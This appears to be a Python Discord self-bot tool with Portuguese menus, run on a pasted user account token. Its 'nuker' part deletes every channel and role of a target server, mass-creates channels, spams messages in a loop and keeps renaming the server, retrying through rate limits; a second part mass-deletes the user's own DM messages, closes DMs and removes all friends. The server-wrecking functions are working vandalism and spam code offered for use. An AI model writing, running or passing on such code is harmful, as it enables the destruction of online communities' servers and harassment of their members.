import aiohttp
import asyncio
import os
import sys
import requests
import traceback
from colorama import init
init()

import os
os.system("")

#main
class PowerNuker:
    def __init__(self, token: str):
        self.token = token
        self.user_id = None
        self.server_id = None
        self.session = None

    def get_headers(self):
        return {
            'authorization': self.token,
            'accept-language': 'pt-BR,pt;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'accept': '*/*',
        }

    async def create_session(self):
        if not self.session or self.session.closed:
            self.session = aiohttp.ClientSession(headers=self.get_headers())
        return self.session

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def test_token(self):
        try:
            session = await self.create_session()
            async with session.get('https://discord.com/api/v9/users/@me') as r:
                if r.status == 200:
                    data = await r.json()
                    self.user_id = data.get('id')
                    return True
                else:
                    print(f"Token inválido (Status: {r.status})")
                    return False
        except:
            print("Erro ao validar token.")
            return False
        finally:
            await self.close_session()        
            
    def get_server_details(self):
        print("Verificando servidor...")
        print(f"ID recebido: '{self.server_id}'")

        if not self.server_id.isdigit():
            print("Erro: O ID do servidor deve conter apenas números.")
            return False

        try:
            headers = {
                'authorization': self.token,
                'accept-language': 'pt-BR,pt;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'accept': '*/*',
                'referer': 'https://discord.com/channels/@me',
            }

            url = f'https://discord.com/api/v10/guilds/{self.server_id}'

            r = requests.get(url, headers=headers, timeout=12)

            if r.status_code == 200:
                data = r.json()
                print(f"Servidor encontrado: {data.get('name', 'Sem nome')}")
                return True
            elif r.status_code == 400:
                print("Erro 400: ID do servidor inválido ou mal formatado.")
                print("Dica: Certifique-se de que o ID contém apenas números e está completo.")
                return False
            elif r.status_code == 403:
                print("Erro 403: O token não tem permissão para acessar este servidor.")
                return False
            elif r.status_code == 404:
                print("Erro 404: Servidor não encontrado. Verifique se o ID está correto.")
                return False
            else:
                print(f"Erro inesperado (Status: {r.status_code})")
                print(f"Resposta: {r.text[:200]}...")
                return False

        except Exception as e:
            print(f"Exceção ao verificar servidor: {e}")
            return False


    async def safe_request(self, method, url, json=None):
        try:
            session = await self.create_session()
            async with session.request(method, url, json=json, timeout=10) as r:
                if r.status == 429:
                    retry = (await r.json()).get('retry_after', 3)
                    await asyncio.sleep(retry)
                    return await self.safe_request(method, url, json)
                return r
        except:
            return None

    async def spam_loop(self):
        base_name = input("Nome base dos canais: ") or "spam"
        message = input("Mensagem para spammar: ").strip()
        if not message:
            input("\nPressione Enter para voltar...")
            return

        print("\nIniciando spam loop... (Ctrl + C para parar)")
        loop_count = 0
        try:
            while True:
                loop_count += 1
                await self.create_channels(12, f"{base_name}-{loop_count}")
                await self.send_message_in_channels(message)
                await asyncio.sleep(1.8)
        except KeyboardInterrupt:
            print("\n\nSpam loop parado.")
        except Exception:
            pass
        finally:
            print("\nVoltando ao menu...")
            input("\nPressione Enter para voltar ao menu nuker...")

    async def name_loop(self):
        print("\nTrocar nome de servidor em forma de loop --")
        try:
            total_time = int(input("Por quanto tempo quer deixar rodando? (em segundos, 0 = infinito): ") or 0)
        except:
            total_time = 0

        try:
            cooldown = float(input("Qual o tempo entre trocas de nome? (em segundos, ex: 2): ") or 2.0)
        except:
            cooldown = 2.0

        print("\nDigite os nomes que deseja usar (um por linha). Deixe uma linha em branco para finalizar.\n")
        names = []
        while True:
            name = input("Nome: ").strip()
            if not name:
                break
            names.append(name)

        if not names:
            print("Nenhum nome digitado.")
            input("\nPressione Enter para voltar...")
            return

        print(f"\nIniciando troca de nome a cada {cooldown} segundos...")
        if total_time > 0:
            print(f"Tempo total: {total_time} segundos")
        else:
            print("Modo infinito (Ctrl + C para parar)")

        start_time = asyncio.get_event_loop().time()
        try:
            while True:
                for name in names:
                    try:
                        headers = self.get_headers()
                        headers['content-type'] = 'application/json'
                        requests.patch(
                            f'https://discord.com/api/v10/guilds/{self.server_id}',
                            headers=headers,
                            json={'name': name},
                            timeout=8
                        )
                        print(f"Nome alterado → {name}")
                    except:
                        pass
                    await asyncio.sleep(cooldown)

                if total_time > 0:
                    elapsed = asyncio.get_event_loop().time() - start_time
                    if elapsed >= total_time:
                        print(f"\nTempo total ({total_time}s) atingido.")
                        break
        except KeyboardInterrupt:
            print("\n\nTroca de nome parada pelo usuário.")
        except Exception as e:
            print(f"\nErro na troca de nome: {e}")
        finally:
            print("\nFinalizado. Voltando ao menu nuker...")
            input("\nPressione Enter para voltar ao menu nuker...")

    async def delete_all_channels(self):
        print("Deletando canais...")
        try:
            headers = self.get_headers()
            r = requests.get(f'https://discord.com/api/v10/guilds/{self.server_id}/channels', 
                           headers=headers, timeout=10)
            
            if r.status_code != 200:
                print("Falha ao buscar canais.")
                return
                
            channels = r.json()
            deleted = 0
            
            for ch in channels:
                if ch.get('id') == self.server_id:  # protege o servidor
                    continue
                try:
                    requests.delete(f'https://discord.com/api/v10/channels/{ch["id"]}', 
                                  headers=headers, timeout=8)
                    deleted += 1
                    print(f"   Deletados: {deleted}/{len(channels)}", end="\r")
                    await asyncio.sleep(0.10)
                except:
                    await asyncio.sleep(0.25)
                    
            print(f"\nConcluído: {deleted} canais deletados.")
        except:
            print("\nErro ao deletar canais.")

    async def create_channels(self, qtd, base_name):
        print(f"Criando {qtd} canais...")
        created = 0
        for i in range(qtd):
            try:
                await self.safe_request('post', 
                    f'https://discord.com/api/v10/guilds/{self.server_id}/channels',
                    json={'name': f"{base_name}-{i+1}", 'type': 0})
                created += 1
                print(f"   Canais: {created}/{qtd}", end="\r")
                await asyncio.sleep(0.05)
            except:
                await asyncio.sleep(0.20)        # fallback quando der rate limit
        print(f"\nConcluído: {created} canais criados.")

    async def send_message_in_channels(self, content):
        if not content or not content.strip(): return
        print("Enviando mensagens...")
        try:
            headers = self.get_headers()
            headers['content-type'] = 'application/json'
            r = requests.get(f'https://discord.com/api/v10/guilds/{self.server_id}/channels', headers=headers, timeout=10)
            if r.status_code != 200: return
            channels = r.json()
            text_channels = [ch for ch in channels if ch.get('type') == 0]
            sent = 0
            for ch in text_channels:
                try:
                    requests.post(f'https://discord.com/api/v10/channels/{ch["id"]}/messages',
                                  headers=headers, json={'content': content}, timeout=8)
                    sent += 1
                    print(f"   Mensagem enviada ({sent}/{len(text_channels)})", end="\r")
                    await asyncio.sleep(0.25)
                except:
                    await asyncio.sleep(0.4)
            print(f"\nMensagens enviadas para {sent} canais.")
        except Exception as e:
            print(f"Erro ao enviar mensagens: {e}")

    async def delete_all_roles(self):
        print("Deletando todos os cargos...")
        try:
            headers = self.get_headers()
            r = requests.get(f'https://discord.com/api/v10/guilds/{self.server_id}/roles', headers=headers, timeout=10)
            if r.status_code != 200: return
            roles = r.json()
            deleted = 0
            for role in roles:
                if role.get('managed') or role['id'] == self.server_id: continue
                try:
                    requests.delete(f'https://discord.com/api/v10/guilds/{self.server_id}/roles/{role["id"]}', headers=headers, timeout=8)
                    deleted += 1
                    print(f"   Cargo deletado ({deleted}/{len(roles)})", end="\r")
                    await asyncio.sleep(0.25)
                except:
                    pass
            print(f"\n{deleted} cargos deletados.")
        except Exception as e:
            print(f"Erro ao deletar cargos: {e}")

    async def do_all_actions(self):
        print("Iniciando Nuke completo...")
        await self.delete_all_channels()
        await asyncio.sleep(1.0)
        await self.delete_all_roles()
        await asyncio.sleep(1.0)

        resposta = input("\nDeseja criar novos canais após o nuke? (s/n): ").strip().lower()
        if resposta in ['s', 'sim']:
            qtd = int(input("Quantos canais? ") or 25)
            base = input("Nome base dos canais: ") or "nuked-by-power"
            msg = input("Mensagem para enviar (Enter = nenhuma): ").strip()
            await self.create_channels(qtd, base)
            if msg:
                await self.send_message_in_channels(msg)

        print("\nNuke completo finalizado.")
        input("\nPressione Enter para voltar ao menu...")

    async def nuker_menu(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner()
            
            print("\033[96m") 
            print(" " * 2 + "╔════════════════════════════════════════════════════════════╗")
            print(" " * 2 + "║                   POWER NUKER MENU                         ║")
            print(" " * 2 + "╠════════════════════════════════════════════════════════════╣")
            print(" " * 2 + "║                                                            ║")
            print(" " * 2 + "║   [1]  Criar Vários Canais                                 ║")
            print(" " * 2 + "║   [2]  Spam Loop                                           ║")
            print(" " * 2 + "║   [3]  Deletar Todos os Canais                             ║")
            print(" " * 2 + "║   [4]  Enviar Mensagem em Todos os Canais                  ║")
            print(" " * 2 + "║   [5]  Deletar Todos os Cargos                             ║")
            print(" " * 2 + "║   [6]  Trocar Nome do Servidor em Loop                     ║")
            print(" " * 2 + "║   [7]  Nuke Completo                                       ║")
            print(" " * 2 + "║                                                            ║")
            print(" " * 2 + "║   [0]  Voltar ao Menu Principal                            ║")
            print(" " * 2 + "╚════════════════════════════════════════════════════════════╝")
            print("\033[0m")

            choice = input("\nEscolha: ").strip()

            if choice == "0":
                return

            try:
                if choice == "1":
                    qtd = int(input("Quantos canais? ") or 20)
                    name = input("Nome base: ") or "canal"
                    msg = input("Mensagem (Enter = nenhuma): ").strip()
                    await self.create_channels(qtd, name)
                    if msg:
                        await self.send_message_in_channels(msg)
                elif choice == "2":
                    await self.spam_loop()
                elif choice == "3":
                    await self.delete_all_channels()
                elif choice == "4":
                    msg = input("Digite a mensagem: ").strip()
                    if msg:
                        await self.send_message_in_channels(msg)
                elif choice == "5":
                    await self.delete_all_roles()
                elif choice == "6":
                    await self.name_loop()
                elif choice == "7":
                    await self.do_all_actions()
                else:
                    print("Opção inválida!")
            except KeyboardInterrupt:
                print("\n\nOperação parada pelo usuário.")
            except Exception as e:
                print(f"\nErro na opção {choice}: {e}")

            await asyncio.sleep(0.8)

class PowerCleaner:
    def __init__(self, token: str):
        self.token = token
        self.user_id = None
        self.session = None

    def get_headers(self):
        return {
            'authorization': self.token,
            'accept-language': 'pt-BR,pt;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'accept': '*/*',
            'referer': 'https://discord.com/channels/@me',
        }

    async def create_session(self):
        if not self.session or self.session.closed:
            self.session = aiohttp.ClientSession(headers=self.get_headers())
        return self.session

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def test_token(self):
        try:
            session = await self.create_session()
            async with session.get('https://discord.com/api/v9/users/@me') as r:
                if r.status == 200:
                    data = await r.json()
                    self.user_id = data.get('id')
                    print(f"Token válido | {data.get('username')}#{data.get('discriminator')}")
                    return True
                else:
                    print(f"Token inválido (Status: {r.status})")
                    return False
        except:
            print("Erro ao validar token.")
            return False
        finally:
            await self.close_session() 

    async def delete_messages_intelligent(self, channel_id: str, message_ids: list):
        if not message_ids:
            print("Nenhuma mensagem para deletar.")
            return 0

        print(f"\nIniciando deleção de {len(message_ids)} mensagens...\n")
        deleted = 0
        rate_limit_detected = False

        i = 0
        while i < len(message_ids):
            msg_id = message_ids[i]
            try:
                session = await self.create_session()

                # Delay dinâmico
                delay = 0.16 if not rate_limit_detected and i < 60 else 1.05

                async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}/messages/{msg_id}') as r:
                    if r.status in (200, 204):
                        deleted += 1
                        print(f"Apagando mensagens... {deleted}/{len(message_ids)}", end="\r")
                        i += 1  
                    elif r.status == 429:
                        rate_limit_detected = True
                        retry_after = (await r.json()).get('retry_after', 1.0)
                        print(f"\n   Rate limit detectado! Aguardando {retry_after:.2f}s...")
                        await asyncio.sleep(retry_after + 0.5)
                        continue
                    else:
                        print(f"Falha ({r.status})", end="\r")
                        i += 1  # avança em caso de erro permanente

                await asyncio.sleep(delay)

            except Exception:
                await asyncio.sleep(1.8)
                i += 1   # avança em caso de exceção

        print(f"\nConcluído: {deleted} mensagens apagadas.")
        return deleted

    async def clear_specific_dm(self):
        print("\n - Limpar mensagens de uma DM específica - ")
        dm_id = input("Digite o ID da DM (canal): ").strip()
        if not dm_id:
            input("\nPressione Enter para voltar...")
            return

        total_deleted = 0
        batch_number = 0
        before = None

        try:
            session = await self.create_session()

            while True:
                batch_number += 1
                print(f"\nCarregando conversa {batch_number}")

                params = {'limit': '100'}
                if before:
                    params['before'] = before

                async with session.get(f'https://discord.com/api/v9/channels/{dm_id}/messages', params=params) as r:
                    if r.status != 200:
                        print(f"Parado (Status: {r.status})")
                        break

                    messages = await r.json()
                    if not messages:
                        print("Fim da DM alcançado.")
                        break
                    my_message_ids = [m['id'] for m in messages if m.get('author', {}).get('id') == self.user_id]

                    if my_message_ids:
                        print("Carregando conversa...")
                        deleted_in_batch = await self.delete_messages_intelligent(dm_id, my_message_ids)
                        total_deleted += deleted_in_batch
                    else:
                        print("   Nenhuma mensagem sua neste lote")

                    before = messages[-1]['id']
                    await asyncio.sleep(0.75)

                if len(messages) < 80:
                    print("Fim da DM detectado.")
                    break

            print(f"\n\nLimpeza completa.")
            print(f"   Total de mensagens deletadas: {total_deleted}")

        except Exception as e:
            print(f"[ERRO] Falha durante o processo: {e}")
        finally:
            await self.close_session()
            input("\nPressione Enter para voltar ao menu...")

    async def clear_all_friends_dms(self):
        print("\n- Limpar mensagens de todas as DMs (amigos) -")
        print("Buscando lista de amigos...")

        session = await self.create_session()
        async with session.get('https://discord.com/api/v9/users/@me/relationships') as r:
            if r.status != 200:
                print("Erro ao buscar amigos.")
                input("\nPressione Enter para voltar...")
                return
            friends = [f for f in await r.json() if f.get('type') == 1]

        if not friends:
            print("Nenhum amigo encontrado.")
            input("\nPressione Enter para voltar...")
            return

        print(f"{len(friends)} amigos encontrados.\n")
        total_deleted = 0
        processed = 0

        for friend in friends:
            user = friend['user']
            processed += 1
            print(f"[{processed}/{len(friends)}] Processando DM com {user.get('username', 'Unknown')}...")

            try:
                # abrir dm
                async with session.post('https://discord.com/api/v9/users/@me/channels', 
                                      json={"recipient_id": user['id']}) as r:
                    if r.status != 200:
                        print("   Não foi possível abrir a DM.")
                        await asyncio.sleep(1.0)
                        continue
                    dm = await r.json()
                    dm_id = dm['id']

                #escanear mnsgs em lotes
                my_message_ids = []
                before = None
                scan_loops = 0

                while scan_loops < 35:   # limite por DM
                    scan_loops += 1
                    params = {'limit': '100'}
                    if before:
                        params['before'] = before

                    async with session.get(f'https://discord.com/api/v9/channels/{dm_id}/messages', params=params) as r:
                        if r.status != 200:
                            break
                        messages = await r.json()
                        if not messages:
                            break

                        my_msgs = [m['id'] for m in messages if m.get('author', {}).get('id') == self.user_id]
                        my_message_ids.extend(my_msgs)

                        before = messages[-1]['id']
                        await asyncio.sleep(0.75)

                    if len(messages) < 80:
                        break

                # del mensagens encontradas
                if my_message_ids:
                    deleted = await self.delete_messages_intelligent(dm_id, my_message_ids)
                    total_deleted += deleted
                    print(f"   Deletadas {deleted} mensagens nesta DM")
                else:
                    print("   Nenhuma mensagem sua encontrada nesta DM")

            except Exception as e:
                print(f"   Erro ao processar esta DM: {e}")

            await asyncio.sleep(1.2)   # delay entre amigos

        print(f"\n\nLimpeza completa.")
        print(f"   Total de mensagens deletadas em todas as DMs: {total_deleted}")
        input("\nPressione Enter para voltar ao menu...")

    async def close_all_dms(self):
        print("\n- Fechar todas as DMs -")
        print("Buscando DMs abertas...")

        session = await self.create_session()
        async with session.get('https://discord.com/api/v9/users/@me/channels') as r:
            if r.status != 200:
                print("Erro ao buscar DMs.")
                input("\nPressione Enter para voltar...")
                return
            dms = await r.json()

        print(f"{len(dms)} DMs encontradas.\n")
        closed = 0

        for dm in dms:
            try:
                async with session.delete(f'https://discord.com/api/v9/channels/{dm["id"]}') as r:
                    if r.status in (200, 204):
                        closed += 1
                        print(f"   DM fechada ({closed}/{len(dms)})", end="\r")
                await asyncio.sleep(0.65)
            except:
                pass

        print(f"\n{closed} DMs fechadas.")
        input("\nPressione Enter para voltar ao menu...")

    async def remove_all_friends(self):
        print("\n- Remover todos os amigos -")
        print("Buscando amigos...")

        session = await self.create_session()
        async with session.get('https://discord.com/api/v9/users/@me/relationships') as r:
            if r.status != 200:
                print("Erro ao buscar amigos.")
                input("\nPressione Enter para voltar...")
                return
            friends = [f for f in await r.json() if f.get('type') == 1]

        print(f"{len(friends)} amigos encontrados.\n")
        removed = 0

        for friend in friends:
            user = friend['user']
            try:
                async with session.delete(f'https://discord.com/api/v9/users/@me/relationships/{user["id"]}') as r:
                    if r.status in (204, 200):
                        removed += 1
                        print(f"   Removendo... {removed}/{len(friends)}", end="\r")
                await asyncio.sleep(1.1)
            except:
                pass

        print(f"\n{removed} amigos removidos.")
        input("\nPressione Enter para voltar ao menu...")
        
    async def dm_menu(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner()

            print("\033[96m")
            print("╔════════════════════════════════════════════════════════════╗")
            print("║                     MENU DMs                              ║")
            print("╠════════════════════════════════════════════════════════════╣")
            print("║   [1] Limpar uma DM específica                           ║")
            print("║   [2] Limpar todas as DMs dos amigos                     ║")
            print("║   [3] Fechar todas as DMs                                ║")
            print("║   [4] Remover todos os amigos                            ║")
            print("║   [0] Voltar                                             ║")
            print("╚════════════════════════════════════════════════════════════╝")
            print("\033[0m")

            print("\033[96m")  
            sub = input("\nEscolha: ").strip()

            if sub == "1":
                await self.clear_specific_dm()
            elif sub == "2":
                await self.clear_all_friends_dms()
            elif sub == "3":
                await self.close_all_dms()
            elif sub == "4":
                await self.remove_all_friends()
            elif sub == "0":
                break
            else:
                print("Opção inválida!")
                await asyncio.sleep(1.2)        

    async def main_menu(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner()
            
            print("\033[96m")  #ciano
            print("╔════════════════════════════════════════════════════════════╗")
            print("║                   MENU PRINCIPAL                           ║")
            print("╠════════════════════════════════════════════════════════════╣")
            print("║                                                            ║")
            print("║   [1] Nukar Servidor                                       ║")
            print("║   [2] Limpar Mensagens em DMs                              ║")
            print("║   [3] Sair                                                 ║")
            print("║                                                            ║")
            print("╚════════════════════════════════════════════════════════════╝")
            print("\033[0m")

            print("\033[96m")  
            choice = input("\nEscolha uma opção: ").strip()

            if choice == "1":
                # nuker
                if self.session and not self.session.closed:
                    await self.close_session()

                nuker = PowerNuker(self.token)
                nuker.user_id = self.user_id
                
                server_id_input = input("\nDigite o ID do Servidor: ").strip()
                if not server_id_input:
                    print("ID inválido.")
                    input("\nPressione Enter para voltar...")
                    continue
                
                nuker.server_id = server_id_input
                
                if nuker.get_server_details():
                    print("Servidor validado com sucesso.")
                    await nuker.nuker_menu()
                else:
                    print("Não foi possível acessar o servidor.")
                    input("\nPressione Enter para voltar...")
            elif choice == "2":
                    await self.dm_menu()
            elif choice == "3":
                print("Saindo...")
                await self.close_session()
                sys.exit(0)
            else:
                print("Opção inválida!")
                await asyncio.sleep(1.2)

def print_banner():
    CYAN = "\033[96m"
    RESET = "\033[0m"

    print(CYAN)
    print(" ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ")
    print(" ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗")
    print(" ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝")
    print(" ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗")
    print(" ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║")
    print(" ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝")
    print("")
    print("                          @favoreci\n")
    print(RESET)

async def main():
    print_banner()
    print("\n" + "─" * 60)
    print("   Caso não saiba como pegar seu token, acesse este tutorial:")
    print("   https://www.youtube.com/watch?v=hPZ5bhdbuEk")
    print("─" * 60)
    token = input("Cole seu token do discord (sem aspas): ").strip()

    cleaner = PowerCleaner(token)
    if not await cleaner.test_token():
        input("\nPressione Enter para sair...")
        return

    await cleaner.main_menu()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nPrograma encerrado pelo usuário.")
    except Exception as e:
        print(f"\n[ERRO FATAL] {e}")
        traceback.print_exc()
    finally:
        input("\nPressione Enter para fechar a janela...")